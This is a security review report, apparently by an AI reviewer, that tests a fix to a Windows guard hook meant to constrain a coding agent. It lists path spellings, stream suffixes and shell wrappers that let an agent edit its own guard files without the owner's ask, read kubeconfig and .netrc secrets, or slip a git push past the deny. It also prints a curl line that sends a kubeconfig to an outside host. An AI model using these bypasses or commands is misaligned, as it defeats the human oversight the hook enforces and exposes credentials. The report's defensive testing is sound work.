# Security review: hooks on Windows, fix round (re-review of H1, M1, M2, L2)

Stage 5 (Verify), scoped re-review. Branch `hooks-windows-2`, fix commit `79950fd` on top of `7655db1`
(diff `7655db1..79950fd`, worktree `.claude/worktrees/hooks-windows-2`, read only). Reviewer model: Claude Opus 5.5
(`claude-opus-5-5`). In scope: TR-13 (parent: all FR; the guard hook). Articles: Art. VI (hooks are never worked
around, no secrets, settings and constitution edits ask the owner) and Art. VIII (reviewers write only their
reports). First report: `ai/reviews/security-hooks-windows.md`. This file is not committed.

## Method

Skills: `differential-review` (diff, fail-closed paths, untested changes) and `sharp-edges` (path canonicalisation
and wrapper parsing as footguns). I read the whole diff of `guard.py`, `reviewer_writes.py`, `test_guard.py` and
`test_hooks.py`, and every call site of the new helpers (`native`, `strip_streams`, `local_host`, `temp_dir`,
`odd_root`, `repo_rel`, `in_scratch`, `check_windows_shell`, the `$` branch of `check_words`).

Probes: hook events built in Python and passed to `decide()` of three guard versions loaded from git
(`ba1b643` base, `7655db1` first commit, `79950fd` now), and the key events again through the real process
(`python -I .claude/hooks/guard.py` on stdin). `USERPROFILE` and `HOME` pointed at `D:\fakehome` (does not exist),
so no real home folder or kubeconfig was opened. Whether Windows opens a spelling was checked only by reading the
tracked, secret-free `build.gradle` with Node `fs.readFileSync` and Git Bash `cat`.

Python version matters: `settings.json` runs the hook as `python3`, which is 3.14.6 on this machine; `python` is
3.10.11, which the implementer also tests. `ntpath.splitdrive` differs between them, so the probes ran on both.

| Command | Result | Notes |
| --- | --- | --- |
| `git diff 7655db1..79950fd` (5 files) | read in full | guard.py +140, reviewer_writes.py +2, tests +106 |
| `python3 -I .claude/hooks/test_guard.py` (Windows, 3.14.6) | passed 803 of 803 | 1 skipped (slow git) |
| `python -I .claude/hooks/test_guard.py` (Windows, 3.10.11) | passed 803 of 803 | 1 skipped |
| `python3 -I .claude/hooks/test_hooks.py` (Windows, 3.14.6) | passed 238 of 238 | |
| `python -I .claude/hooks/test_hooks.py` (Windows, 3.10.11) | passed 238 of 238 | |
| First-report rows, three versions, 3.14 and 3.10 | read | table below |
| New path spellings: 20 roots on Write, 7 on Read, 21 Bash, 16 stream forms | read | Finding H1b, M1b |
| Windows shell bypasses: 80 Bash commands, base and now | read | Finding L-a, L-b |
| Reviewer limit (`reviewer_writes.py` as `security-reviewer`): 16 events | read | allow list holds |
| Scratch root with `TEMP` inside the repository, and the real `TEMP` | read | L2 closed |
| Node and Git Bash opens of `build.gradle`, 17 spellings | read | which aliases are real |

Not run, and why:

- The Linux suites in Docker: the reviewer write limit denies `docker run`. Linux behaviour was checked by reading
  (see "Checked and clean"). The Linux counts (694 of 694, 215 of 215) are the implementer's. Status: not run.
- Python 3.11 to 3.13: not installed here. Status: not run.
- Writes through an alias: only reads were done. That `cp` and redirects work where `cat` opens a spelling is
  inferred (Git Bash converts the path the same way for open and create).

### First-report rows, base / first / now

Same answer on 3.14 and 3.10 unless marked.

| Row | Event | base | first | now |
| --- | --- | --- | --- | --- |
| H1 | `Write \\?\<repo>\.claude\hooks\guard.py` | ask | allow | ask |
| H1 | `Write \\.\<repo>\.claude\hooks\guard.py` | ask | allow | ask |
| H1 | `Write \\localhost\D$\<repo>\.claude\settings.json` | ask | allow | ask |
| H1 | `Edit \\localhost\D$\<repo>\.claude\docs\CONSTITUTION.md` | ask | allow | ask |
| H1 | `NotebookEdit \\?\<repo>\.claude\docs\CONSTITUTION.md` | ask | allow | ask |
| H1 | `mcp__pycharm__create_new_file`, `pathInProject` `\\?\<repo>\.claude\settings.json` | deny | allow | ask |
| H1 | Bash `echo x > '\\?\<repo>\.claude\settings.json'` | deny | allow (3.14), deny (3.10) | ask |
| H1 | Bash `cp x '\\?\<repo>\.claude\hooks\guard.py'` | deny | allow (3.14), deny (3.10) | ask |
| M1 | `Read \\?\D:\fakehome\.kube\config` | allow | allow | deny |
| M1 | `Read <repo>\.env::$DATA`, `Read <home>\.netrc::$DATA`, `Read <repo>\id_rsa::$DATA` | allow | allow | deny |
| M1 | `Write <repo>\.claude\settings.json::$DATA`, `Edit ...\CONSTITUTION.md::$DATA` | allow | allow | ask |
| M1 | Bash `cat /proc/cygdrive/d/fakehome/.kube/config` | allow | allow | deny |
| M1 | Bash `cp x /proc/cygdrive/d/<repo>/.claude/hooks/guard.py` | allow | allow | ask |
| M1 | Bash `docker run -v /proc/cygdrive/d/fakehome/.kube:/k img` | allow | allow | deny |
| M1 | Bash `findstr . '.env::$DATA'` | allow | allow | deny |
| M2 | `cmd //c "git push origin main"`, `cmd.exe /c git push`, `'C:\...\cmd.exe' /c git push` | allow | allow | deny |
| M2 | `powershell -c "git push origin main"`, `pwsh -Command git push`, `wsl git push`, `start git push` | allow | allow | deny |
| M2 | `cmd //c "rmdir /s /q src"`, `cmd //c mklink /J build\j '<repo>'`, `subst X: '<repo>'` | allow | allow | ask |

Every row of the first report is closed as written. The bash write ask for `settings.json` matches the plain
spelling (`echo x > .claude/settings.json` asks too).

## Findings

### H1b (high): two more spellings of the repository still edit guard files with no ask

- Where: `.claude/hooks/guard.py:593-597` (`strip_streams`) and `:600-620` (`native`); the result reaches
  `repo_rel` (`:708`), `claude_config` (`:2228`), `constitution` (`:2243`) and `is_secret_path` (`:683`). Breaks
  TR-13 and Art. VI ("the hooks are never worked around ... edits to this page, the hooks and `settings.json` ask
  the owner"; never read a kubeconfig). H1 is not fully closed.
- Root cause: `strip_streams` deletes every `:` segment after a leading drive letter, including a drive colon that
  is not at the start and the colons of an IPv6 host. The mangled word then looks like a rooted path on the current
  drive (`D:\??\D\...`, `D:\D$\...`), which `repo_rel` places outside the repository and allows. `native` also does
  not know the `\??\` prefix.
- Case 1, `\??\` (the NT object prefix). Git Bash opens it (`cat '\??\D:\<repo>\build.gradle'` and
  `cat '\??\UNC\localhost\D$\<repo>\build.gradle'` both read the file). Node does not (ENOENT), so only Bash counts.
  Measured on `79950fd`, real process, `python3` (3.14), the interpreter `settings.json` uses:

  | Event | base 3.14 | base 3.10 | now 3.14 | now 3.10 |
  | --- | --- | --- | --- | --- |
  | Bash `cp x '\??\<repo>\.claude\hooks\guard.py'` | allow | deny | allow | allow |
  | Bash `echo x > '\??\<repo>\.claude\settings.json'` | allow | deny | allow | allow |
  | Bash `sed -i s/a/b/ '\??\<repo>\.claude\docs\CONSTITUTION.md'` | allow | deny | allow | allow |
  | Bash `cat '\??\D:\fakehome\.kube\config'` | allow | deny | allow | allow |
  | Bash `tar cf - '\??\D:\fakehome\.kube'` | allow | deny | allow | allow |
  | Bash `cp x '\??\UNC\localhost\D$\<repo>\.claude\hooks\guard.py'` | allow | allow | allow | allow |
  | Bash `cat '\??\UNC\localhost\D$\fakehome\.kube\config'` | allow | allow | allow | allow |

- Case 2, IPv6 loopback share `\\::1\D$\...` (also `//::1/D$/...` and `\\?\UNC\::1\D$\...`). Node opens all three
  (checked on `build.gradle`), so the Write, Edit and Read tools reach the file. On 3.10, `79950fd` allows; on 3.14
  `ntpath.splitdrive` reads `\\\D$` as a share and the guard fails closed by luck of the Python version:

  | Event | base | now 3.14 | now 3.10 |
  | --- | --- | --- | --- |
  | `Write \\::1\D$\<repo>\.claude\hooks\guard.py` | ask | ask | allow |
  | `Edit \\::1\d$\<repo>\.claude\docs\CONSTITUTION.md` | ask | ask | allow |
  | `mcp__pycharm__create_new_file`, `pathInProject` `\\::1\D$\<repo>\.claude\settings.json` | deny | deny | allow |
  | `Read \\::1\D$\fakehome\.kube\config` | allow | deny | allow |
  | `Write \\?\UNC\::1\D$\<repo>\.claude\hooks\guard.py` | ask | ask | allow |

- How it could be abused: one call, no setup. An agent refused an edit of `guard.py` runs
  `cp x '\??\D:\...\.claude\hooks\guard.py'` from Git Bash, or (on a machine whose `python3` is 3.10 to 3.12) uses
  the Write tool on `\\::1\D$\...\guard.py`. After that the guard and the owner's ask are gone for every later
  call. `cat '\??\C:\Users\<user>\.kube\config'` reads the real kubeconfig in one call. Case 1 is not a regression
  against `main` on 3.14 (base allows) but is on 3.10 (base denies); case 2 is a regression on 3.10. Both are the
  device and share alias class H1 was raised for, and this round claims to fail closed on it, so it stays High.
- No test covers either: `windows_alias_cases` has no `\??\` and no IPv6 host, and the suite passes on 3.10 with
  case 2 open.
- Suggested fix:
  - In `native`, map `\??\X:\` like `\\?\X:\` and `\??\UNC\` like `\\?\UNC\`.
  - Split off the root with the guard's own regex (drive letter, `\\host\share`, device prefix) before
    `strip_streams`, and strip stream suffixes only from the parts after the root. Never remove a `:` from a host
    name or a drive.
  - If a `:` is left in the root, or the word starts with a single `\` or `/` followed by `??`, fail closed: raise
    in `repo_rel` (ask for file tools, deny for Bash and MCP writes) and count it as an `odd_root` for secrets.
  - Make `odd_root` and `repo_rel` decide from that regex, not from `ntpath.splitdrive`, so 3.10 and 3.14 agree.
  - Add the rows above to `windows_alias_cases` (ASK for the guard file writes, DENY for the kubeconfig reads and
    for the MCP write) and run the suite on 3.10 and 3.14.

### M1b (medium): Bash reads a secret through an admin share host the guard does not map (M1, partly open)

- Where: `.claude/hooks/guard.py:2291-2300` (the `$` branch of `check_words`). Breaks Art. VI (never read a secret
  or a kubeconfig). Not a regression: the base allows the same.
- `native` maps `\\localhost`, `\\127.x.x.x` and `%COMPUTERNAME%` admin shares to a drive. Any other host that
  reaches this machine keeps its `$`, so the word is treated as a variable and only its literal file name is
  checked (`config` and `.netrc` pass). Git Bash opens `\\0--1.ipv6-literal.net\D$\<repo>\build.gradle`.
- Measured on `79950fd` (3.14 and 3.10): Bash `cat '\\0--1.ipv6-literal.net\D$\fakehome\.kube\config'` allow,
  Bash `base64 '\\0--1.ipv6-literal.net\D$\fakehome\.netrc'` allow. The Read tool on the same path denies, because
  `is_secret_path` matches the folders after an `odd_root`. The machine's LAN address or DNS name works the same way
  where SMB to itself is allowed.
- How it could be abused: one Bash call, `cat '\\0--1.ipv6-literal.net\C$\Users\<user>\.kube\config'`.
- Suggested fix: in the `$` branch, when the word matches `ADMIN_SHARE` for any host, read the `$` there as a
  literal, build the path and run `is_secret_path` on it (the `odd_root` folder match then denies). Add the row to
  `windows_alias_cases`.

### L-a (low): `cmd` escapes and variables, and some PowerShell and `start` forms, turn the git push deny into an ask

- Where: `.claude/hooks/guard.py:2569-2591` (`check_windows_shell`). TR-13, Art. VI (no push).
- Measured on `79950fd`, each ask (not deny): `cmd /c g^it push`, `cmd /c "g^it push"`, `cmd /c"git push"`,
  `cmd /cgit push`, `cmd /v:on /c "set x=git&& !x! push"` (the base denied this one only because it could not parse
  it), `pwsh -command:"git push"`, `powershell -c "Start-Process git -ArgumentList push"`,
  `start "title" /b git push`, `wsl -d Ubuntu git push`, `wsl -u root git push`. Encoded commands (`-enc`, `-e`,
  `-ec`, `-EnC`, `-EncodedCommand`) and stdin (`echo git push | cmd`, `powershell -`) also ask.
- Every one still asks, so nothing runs without the owner. The ask text does not say a push is inside. This is the
  "interpreter one-liner" limit class. Backlog: strip `^` and read `-command:`, `/c` glued to its command, and
  the `start` title and `wsl -d`/`-u` options before the inner analysis.

### L-b (low): Windows command runners outside the list run commands the guard and the reviewer limit do not read

- Where: `.claude/hooks/guard.py:2564` (`WINDOWS_SHELLS`) and `reviewer_writes.py:166`. TR-13, Art. VI, Art. VIII.
- Measured allow on `79950fd`: `conhost git push`, `conhost.exe cmd /c git push`, `wt git push`,
  `forfiles /c "cmd /c git push"`, `wmic process call create "git push"`, `runas /user:x "git push"`,
  `schtasks /create /tn x /tr "git push" /sc once /st 00:00`. As a reviewer, `conhost cmd /c "echo x > src\A.java"`
  is allowed.
- The same holds on every platform for `tmux new 'git push'`, `screen git push` and, for reviewers,
  `python -c "open('src/A.java','w')"` (measured), so this is the documented limit class. Backlog: add `conhost`,
  `wt`, `forfiles`, `wmic`, `runas` and `schtasks` to the Windows runners (ask, and deny for reviewers).

### Outside the scope of this change (pre-existing on every platform, for the backlog)

- `dd if=<home>/.kube/config of=x` and `curl --data-binary @<home>/.kube/config http://x` are allowed, and
  `dd if=x of=<repo>/.claude/settings.json` is allowed with no ask (base, first and now alike). The guard does not
  read paths inside `if=`, `of=` and `@file` arguments. Not graded against TR-13 here.

## Checked and clean

- L2 closed: `temp_dir()` reads `TEMP`, then `TMP`; `tempfile.gettempdir()` (which prefers `TMPDIR`) is only the
  fallback. With `TEMP` set to the worktree, `in_scratch` refuses the root, and `rm -rf /tmp/src`,
  `rm -rf /tmp/.claude/hooks` and `rm -rf /tmp/claude/../src` deny. With the real `TEMP`, `rm -rf /tmp/claude/x`
  is allowed and `rm -rf /tmp/claude/../x` denies.
- M2 closed for the named shells: every `cmd`, `powershell`, `pwsh`, `wsl` and `start` call asks at least, and a
  plain inner `git push` or `kubectl delete` denies, through nesting and wrappers: `cmd /c cmd /c git push`,
  `cmd /c "cmd /c \"git push\""`, `powershell '& "git" push'`, `wsl -e git push`, `wsl -- git push`,
  `start /b git push`, `start "" git push`, `cmd /s /c "git push"`, `cmd /c "echo a & git push"`,
  `env cmd /c git push`, `exec`, `nohup`, `timeout`, `xargs`, `bash -c "cmd /c git push"`,
  `sh -c "powershell -c \"git push\""`, `start cmd /c git push`, `PowerShell.EXE`, `Cmd`. `mklink` and `subst` ask.
  `cmd /c "type .env"` and `powershell -c "Get-Content $HOME/.kube/config"` deny.
- The other new spellings fail closed (ask for guard files, deny for kubeconfig reads) on 3.14 and 3.10: mixed
  case `\\?\d:\`, `//?/D:/`, `\\?\GLOBALROOT\...`, `\\?\Volume{...}\...`, `\\LOCALHOST\D$`, `\\LocalHost\d$`,
  `\\[::1]\D$`, `\\0--1.ipv6-literal.net\D$`, `\\0:0:0:0:0:0:0:1\D$`, `\\127.0.0.1\D$`, `\\127.0.0.1.\D$`,
  `\\localhost.\D$`, `\\127.1\D$`, `\\?\UNC\localhost\D$`, `\\.\unc\127.0.0.2\D$`, and `\\?\D:\...\.`.
- Streams: `.ENV::$data`, `.kube::$INDEX_ALLOCATION\config`, `.kube:$I30:$INDEX_ALLOCATION\config` and
  `.ssh\id_ed25519:$DATA` deny for Read and Write; `.claude::$INDEX_ALLOCATION\settings.json`,
  `.claude\hooks::$INDEX_ALLOCATION\guard.py`, `CONSTITUTION.md:x` and `settings.json:Zone.Identifier` ask for
  Write. Node opens a folder stream spelling (`<dir>::$INDEX_ALLOCATION\build.gradle`), so these rows matter.
- Fail closed (point 4): the new `ValueError` in `repo_rel` is caught by no caller (the only `except ValueError`
  blocks are in `exists` and the kind-state reader) and ends in `main`, which asks for file tools and denies for
  Bash and MCP writes. `check_mv` asks for an `odd_root`. Evaluating `claude_config` and `constitution` only for
  writes means a read of a share path no longer crashes; secrets are checked before that.
- Linux and macOS (point 3), by reading: every new helper and branch is behind `WINDOWS`. `native` returns at its
  first line, so `strip_streams`, `local_host`, `temp_dir` and the new regexes never run; `odd_root` starts with
  `WINDOWS and`; the `repo_rel` block, the two `check_words` additions, `check_mv`'s ask, the
  `check_windows_shell` call (`:2640`) and `reviewer_writes.py:166` are gated. `target_paths` now calls
  `native`, which is the identity. `in_scratch` adds one condition to an allow, so it can only deny more. The
  reordered `and` in `check_words` and `check_mcp` changes only evaluation order; `os.path.relpath` does not raise
  on POSIX. No Linux decision can move toward allow. The Linux suites were not run (see Method).
- Reviewer limit: `in_reviews` is an allow list checked after `realpath`. `Write \??\<repo>\src\A.java`,
  `Write \\::1\D$\<repo>\src\A.java`, `Write <repo>\ai::$INDEX_ALLOCATION\reviews\x.md`, Bash
  `echo x > '\??\<repo>\src\A.java'`, and `cmd /c`, `powershell -c`, `wsl`, `start`, `mklink`, `cmd.exe` all deny
  for `security-reviewer`; `Write <repo>\ai\reviews\x.md` is allowed.
- Tests: no row is removed or loosened. The fix adds 53 Windows rows (`windows_alias_cases`), one environment row
  (`windows_env_cases`, the L2 case) and 8 reviewer rows. The em dash in `test_hooks.py` became `\u2014`, the same
  character, so those cases are unchanged.
- The diff holds no secret value, token or credential, and changes no dependency, settings file or constitution.

Verdict: needs fixes (blocked by a High). The fix closes every row of H1, M1, M2 and L2 as reported, and opens
nothing on Linux. But `strip_streams` and the missing `\??\` mapping leave two spellings of the same H1 class open
(H1b): a Git Bash write to `guard.py`, `settings.json` or the constitution through `\??\`, and on Python 3.10 a
Write-tool edit through `\\::1\D$`. M1b, L-a and L-b can go to the TR-13 backlog. L1 stays on the backlog as agreed.
